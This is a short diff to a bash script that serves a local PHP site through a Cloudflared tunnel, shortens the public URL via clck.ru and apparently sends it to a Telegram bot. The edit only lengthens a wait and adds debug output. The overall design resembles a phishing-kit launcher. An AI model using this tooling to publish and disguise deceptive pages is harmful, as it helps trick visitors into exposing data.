@@ -80,7 +80,6 @@ start_php_server() {
     echo $RANDOM_PORT > ../.tunnels_log/port.log
     cd ..
 }
-
 # Function to start Cloudflared tunnel and shorten URL
 start_cloudflared() {
     echo -e "\n[+] Starting Cloudflared tunnel..."
@@ -91,12 +90,19 @@ start_cloudflared() {
         ./.host/cloudflared tunnel -url http://127.0.0.1:$RANDOM_PORT > .tunnels_log/.cloudfl.log 2>&1 &
     fi
 
-    sleep 12
+    sleep 15  # Adjust sleep time as needed, depending on how long it takes for Cloudflared to start
+
+    # Debugging: Print the contents of .cloudfl.log to see what's happening
+    echo -e "\nContents of .cloudfl.log:"
+    cat .tunnels_log/.cloudfl.log
+
+    # Check if Cloudflared URL is found in the log file
     cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnels_log/.cloudfl.log)
     if [[ -z $cldflr_url ]]; then
         echo "Error: Cloudflared URL not found."
         exit 1
     fi
+
     shortened_url=$(curl -s http://clck.ru/--?url=${cldflr_url})
 
     echo -e "\nCloudflared URL: ${cldflr_url}"
@@ -110,6 +116,7 @@ start_cloudflared() {
         echo "config.ini not found in .www folder. Cannot send URL to Telegram."
     fi
 }
+
 
 # Function to setup and run Telegram bot
 setup_telegram_bot() {
